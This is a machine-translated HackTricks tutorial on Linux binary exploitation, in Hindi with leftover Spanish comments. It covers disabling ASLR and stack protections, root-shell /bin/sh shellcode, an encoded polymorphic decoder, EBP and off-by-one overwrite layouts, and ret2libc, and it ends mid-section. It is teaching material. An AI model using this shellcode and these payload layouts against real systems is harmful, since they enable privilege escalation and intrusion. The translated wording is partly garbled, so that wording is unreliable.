# рд▓рд┐рдирдХреНрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯрд┐рдВрдЧ (рдореВрд▓) (SPA)

## рд▓рд┐рдирдХреНрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯрд┐рдВрдЧ (рдореВрд▓) (SPA)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## **ASLR**

Aleatorizaci├│n de direcciones

**рдЧреНрд▓реЛрдмрд▓ рдПрд▓реЗрдЯрд░рд╛рдЗрдЬреЗрд╢рди (ASLR) рдЕрдХреНрд╖рдо рдХрд░реЗрдВ (рд░реВрдЯ)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
рдЧреНрд▓реЛрдмрд▓ рдПрд▓реЗрдЯрд░рд╛рдЗрдЬреЗрд╢рди рдкреБрдирдГ рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдВ: echo 2 > /proc/sys/kernel/randomize\_va\_space

**рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдЕрдХреНрд╖рдо рдХрд░реЗрдВ** (рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ):\
setarch \`arch\` -R ./рдЙрджрд╛рд╣рд░рдг рддрд░реНрдХ\
setarch \`uname -m\` -R ./рдЙрджрд╛рд╣рд░рдг рддрд░реНрдХ

**рд╕реНрдЯреИрдХ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрди рд╕реБрд░рдХреНрд╖рд╛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack рдЙрджрд╛рд╣рд░рдг.c -o рдЙрджрд╛рд╣рд░рдг

**рдХреЛрд░ рдлрд╝рд╛рдЗрд▓**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**рдкрд╛рда**\
**рдбреЗрдЯрд╛**\
**BSS**\
**рд╣реАрдк**

**рд╕реНрдЯреИрдХ**

**рдЦрдВрдб BSS**: рдмрд┐рдирд╛ рд╢реБрд░реВрдЖрдд рдХреЗ рдЧреНрд▓реЛрдмрд▓ рдпрд╛ рд╕реНрдерд╛рдпреА рдЪрд░реЛрдВ
```
static int i;
```
**рдбреЗрдЯрд╛ рдЦрдВрдб**: рдЧреНрд▓реЛрдмрд▓ рдпрд╛ рд╕реНрдерд┐рд░ рдЪрд░ рдЬреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдд рд╣реИрдВ
```
int i = 5;
```
**рдЦрдВрдб TEXT**: рдХреЛрдб рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ (рдУрдкрдХреЛрдб)

**рдЦрдВрдб HEAP**: рдбрд╛рдпрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдЖрд░рдХреНрд╖рд┐рдд рдмрдлрд░ (malloc(), calloc(), realloc())

**рдЦрдВрдб STACK**: рд╕реНрдЯреИрдХ (рдкрд╛рд░рд┐рдд рддрддреНрд╡, рдкрд░реНрдпрд╛рд╡рд░рдг рд╕реНрдЯреНрд░рд┐рдВрдЧ (env), рд╕реНрдерд╛рдиреАрдп рдЪрд░тАж)

## **1. рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ**

> рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ, рдмрдлрд░ рдУрд╡рд░рд░рди, рд╕реНрдЯреИрдХ рдУрд╡рд░рд░рди, рд╕реНрдЯреИрдХ рд╕реНрдореИрд╢рд┐рдВрдЧ

рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ рдпрд╛ рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рд╡рд┐рд▓реЗрд╢рди: рдЬрдм рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдореЗрдореЛрд░реА рдкрддреЗ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдХрд┐рд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рднреАрддрд░ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### рд╕рд┐рд╕реНрдЯрдо\_execve рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВ

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

рдЕрд╕реНрддрд┐рддреНрд╡ рдХреЗ kernel interrupts рджреЗрдЦреЗрдВ: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep тАЬ\_\_NR\_тАЭ

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(тАЬ/bin/shтАЭ, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax рдХреЛ рд╕рд╛рдл рдХрд░реЗрдВ\
xor ebx, ebx ; ebx = 0 рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдирд╣реАрдВ рд╣реИ\
mov al, 0x01 ; eax = 1 тАФ> \_\_NR\_exit 1\
int 0x80 ; рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЛ рдЪрд▓рд╛рдПрдВ

**nasm -f elf assembly.asm** тАФ> рдПрдХ .o рдлрд╝рд╛рдЗрд▓ рджреЗрддрд╛ рд╣реИ\
**ld assembly.o -o shellcodeout** тАФ> рдПрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрд╕реЗрдореНрдмрд▓реА рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╣рдо рдУрдкрдХреЛрдбреНрд╕ рдХреЛ **objdump** рдХреЗ рд╕рд╛рде рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ\
**objdump -d -Mintel ./shellcodeout** тАФ> рд╣рдореЗрдВ рдпрд╣ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдорд╛рд░рд╛ рд╢реЗрд▓рдХреЛрдб рд╣реИ рдФрд░ рдУрдкрдХреЛрдбреНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП

**рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╢реЗрд▓рдХреЛрдб рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ**
```
char shellcode[] = тАЬ\x31\xc0\x31\xdb\xb0\x01\xcd\x80тАЭ

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
рдареАрдХ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдкрд┐рдЫрд▓реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ **strace ./рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо** рдореЗрдВ рджрд┐рдЦрдирд╛ рдЪрд╛рд╣рд┐рдПред

рд╢реИрд▓рдХреЛрдб рдмрдирд╛рддреЗ рд╕рдордп рдПрдХ рдЪрд╛рд▓ рд▓рд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдкрд╣рд▓рд╛ рдирд┐рд░реНрджреЗрд╢ рдПрдХ рдХреЙрд▓ рдХреЛ рдЬрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рдХреЙрд▓ рдХреЛрдб рдХреЛ рдореВрд▓ рд░реВрдк рдореЗрдВ рдмреБрд▓рд╛рддрд╛ рд╣реИ рдФрд░ рд╕рд╛рде рд╣реА EIP рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИред рдХреЙрд▓ рдирд┐рд░реНрджреЗрд╢ рдХреЗ рдмрд╛рдж, рд╣рдордиреЗ рдЙрд╕ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдбрд╛рд▓ рджрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА, рдЗрд╕рд▓рд┐рдП рдЙрд╕ EIP рдХреЗ рд╕рд╛рде рд╣рдо рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╛рде рд╣реА рдХреЛрдб рдХреЛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг **рдЪрд╛рд▓ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al ├║ltimo call
popl                %esi                                       ; Guardamos en ese la direcci├│n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=тАЬ/bin/shтАЭ
leal                 0x8(%esi), %ecx      ; arg[2] = {тАЬ/bin/shтАЭ, тАЬ0тАЭ}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(тАЬ/bin/shтАЭ, [тАЬ/bin/shтАЭ, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci├│n
.string             \тАЭ/bin/sh\тАЭ                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
**Stack рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ EJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; тАЬ\0тАЭ
push               dword 0x68732f2f ; тАЬ//shтАЭ
push               dword 0x6e69622f; тАЬ/binтАЭ
mov                ebx, esp                     ; arg1 = тАЬ/bin//sh\0тАЭ
push               eax                             ; Null -> args[1]
push               ebx                             ; тАЬ/bin/sh\0тАЭ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(тАЬ/bin/shтАЭ, args[тАЬ/bin/shтАЭ, тАЬNULLтАЭ], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut├│ fabs
тАж
```
**рдЕрдВрдбрд╛ рд╣рдВрдЯрд░:**

рдпрд╣ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдХреЛрдб рд╣реИ рдЬреЛ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЬреБрдбрд╝реА рдореЗрдореЛрд░реА рдкреЗрдЬреЛрдВ рдХреЛ рджреМрдбрд╝рддрд╛ рд╣реИ рдФрд░ рд╡рд╣рд╛рдВ рд╕рд╣реЗрдЬреА рдЧрдИ рд╢реЗрд▓рдХреЛрдб рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ (рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдбрд╛рд▓реА рдЧрдИ рдХреЛрдИ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЦреЛрдЬрддрд╛ рд╣реИ)ред рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдереЛрдбрд╝реА рд╕реА рдЬрдЧрд╣ рд╣реЛрдиреЗ рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреБрдХреНрддред

**рдкреЙрд▓рд┐рдореЙрд░реНрдлрд┐рдХ рд╢реЗрд▓рдХреЛрдб**

рдпреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╢реЗрд▓реНрд╕ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, Call-Pop рдХреЗ рдЪрд╛рд▓ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдпрд╣ рдПрдХ **рд╕реАрдЬрд╝рд░ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЙрджрд╛рд╣рд░рдг** рд╣реЛрдЧрд╛:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer├б)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu├н va el shellcode
```
1. **рдлреНрд░реЗрдо рдкреЙрдЗрдВрдЯрд░ (EBP) рдХрд╛ рд╣рдорд▓рд╛**

рдпрд╣ рдЙрдкрдпреБрдХреНрдд рд╣реИ рдЬрдм рд╣рдо EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди EIP рдХреЛ рдирд╣реАрдВред

рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╕рдордп рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрд╕реЗрдореНрдмрд▓реА рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```
movl               %ebp, %esp
popl                %ebp
ret
```
рдЗрд╕ рддрд░рд╣, рдпрджрд┐ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди (fvuln) рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╕рдордп EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдмреБрд▓рд╛рдИ рдЧрдИ рд╣реИ, рддреЛ рдЬрдм рдлрд╝рдВрдХреНрд╢рди рдЬреЛ fvuln рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕рдХрд╛ EIP рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

fvuln рдореЗрдВ рдПрдХ рдирдХрд▓реА EBP рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╢реЗрд▓рдХреЛрдб рдХрд╛ рдкрддрд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдЬрдЧрд╣ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ + 4 (рдкреЙрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 4 рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛)ред рдЗрд╕ рддрд░рд╣, рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╕рдордп, ESP рдореЗрдВ &(\&Shellcode)+4 рдХрд╛ рдорд╛рди рдбрд╛рд▓ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдкреЙрдк рдХреЗ рд╕рд╛рде ESP рд╕реЗ 4 рдХрдо рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ рд╢реЗрд▓рдХреЛрдб рдХреЗ рдкрддреЗ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдЧрд╛ рдЬрдм ret рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

**рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ:**\
\&Shellcode + "AAAA" + SHELLCODE + рднрд░рд╛рдИ + &(\&Shellcode)+4

**Off-by-One рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ**\
рдХреЗрд╡рд▓ EBP рдХреЗ рд╕рдмрд╕реЗ рдХрдо рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рдЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИред рдЗрд╕ рддрд░рд╣ рдХрд╛ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╢реЗрд▓рдХреЛрдб рдХрд╛ рдкрддрд╛ рд░рдЦрдиреЗ рд╡рд╛рд▓реА рдореЗрдореЛрд░реА рдХреЛ EBP рдХреЗ рд╕рд╛рде рдкрд╣рд▓реЗ 3 рдмрд╛рдЗрдЯ рд╕рд╛рдЭрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

## **4. return to Libc рд╡рд┐рдзрд┐рдпрд╛рдБ**

рдЬрдм рд╕реНрдЯреИрдХ рдирд┐рд╖реНрдкрд╛рджрдирдпреЛрдЧреНрдп рдирд╣реАрдВ рд╣реИ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЫреЛрдЯрд╛ рдмрдлрд░ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╡рд┐рдзрд┐ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИред

ASLR рдХреЗ рдХрд╛рд░рдг рдкреНрд░рддреНрдпреЗрдХ рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдореЗрдореЛрд░реА рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдкреНрд░рднрд╛рд╡реА рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдПрдХ рд╣реА рдкрддреЗ рдкрд░ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

* **cdecl(C рдШреЛрд╖рдгрд╛)** рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рддрд░реНрдХ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рдмрд╛рдж рд╕реНрдЯреИрдХ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░рддрд╛ рд╣реИ
* **stdcall(рдорд╛рдирдХ рдХреЙрд▓)** рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рддрд░реНрдХ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рд╕реНрдЯреИрдХ рдкрд░ рддрд░реНрдХ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕рд╛рдлрд╝ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдмреБрд▓рд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ
* **fastcall** рдкрд╣рд▓реЗ рджреЛ рддрд░реНрдХреЛрдВ рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рд╢реЗрд╖ рдХреЛ рд╕реНрдЯреИрдХ рдкрд░

libc рдХреА рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдкрддрд╛ рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ " /bin/sh " рдЬреИрд╕рд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЙрд╕реЗ рдПрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд╛рдорд╛рдиреНрдпрдд: рдПрдХ рд╡реЗрд░рд┐рдПрдмрд▓ рд╕реЗред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рдмрд╛рдж рд╢реЗрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рди рд╣реЛрдиреЗ рдкрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдмрд┐рдирд╛ рдХрд┐рд╕реА рд╕рдорд╕реНрдпрд╛ рдХреЗ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрдЬрд┐рдЯ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдФрд░ рд▓реЙрдЧ рд▓рд┐рдЦрдиреЗ рдХреЗ рдмрд┐рдирд╛)ред

**рдирд┐рд░реНрдпрд╛рдд SHELL=/bin/sh**

рд╣рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдареАрдХрд╛рдиреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рджрд┐рд╢рд╛рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:\
**p system**\
**p exit**\
**rabin2 -i executable** тАФ> рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рд▓реЛрдб рд╣реЛрддреЗ рд╕рдордп рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╕рднреА рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХрд╛ рдкрддрд╛ рджреЗрддрд╛ рд╣реИ\
(рдХрд┐рд╕реА рд╕реНрдЯрд╛рд░реНрдЯ рдпрд╛ рдХрд┐рд╕реА рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рдХреЗ рднреАрддрд░): **x/500s $esp** тАФ> рдпрд╣рд╛рдБ рд╕реЗ рд╣рдо /bin/sh рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ

рдПрдХ рдмрд╛рд░ рдЬрдм рд╣рдореЗрдВ рдЗрди рдкрддреЛрдВ рдХрд╛ рдкрддрд╛ рдЪрд▓ рдЬрд╛рдП, рддреЛ **рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ** рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реЛрдЧрд╛:

